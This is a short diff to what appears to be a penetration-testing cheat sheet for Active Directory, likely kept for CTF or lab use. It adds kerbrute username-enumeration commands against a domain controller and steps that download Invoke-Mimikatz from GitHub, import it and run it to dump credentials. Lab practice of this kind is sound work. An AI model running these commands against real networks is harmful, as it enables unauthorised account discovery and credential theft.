@@ -70,7 +70,8 @@ https://github.com/Flangvik/SharpCollection
 ###### Kerberos ~ validating usernames
 ```
 https://github.com/ropnop/kerbrute
-./kerbrute userenum --dc 192.168.1.1 -d domain.htb users.txt
+$ ./kerbrute userenum --dc 192.168.1.1 -d domain.htb users.txt
+$ ./kerbrute userenum --dc 192.168.1.1 -d thinc.local /usr/share/seclists/Usernames/Names/names.txt
 ```
 
 ###### Kerberos ~ AS-REP Roasting
@@ -152,6 +153,11 @@ $ cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe ./
 
 Older Mimikatz version:
 https://github.com/gentilkiwi/mimikatz/files/4167347/mimikatz_trunk.zip
+
+A powershell version of mimikatz
+$ wget https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Invoke-Mimikatz.ps1
+$ Import-Module .\Invoke-Mimikatz.ps1
+$ Invoke-Mimikatz
 
 Start Mimikatz from CMD
 $ .\mimikatz.exe
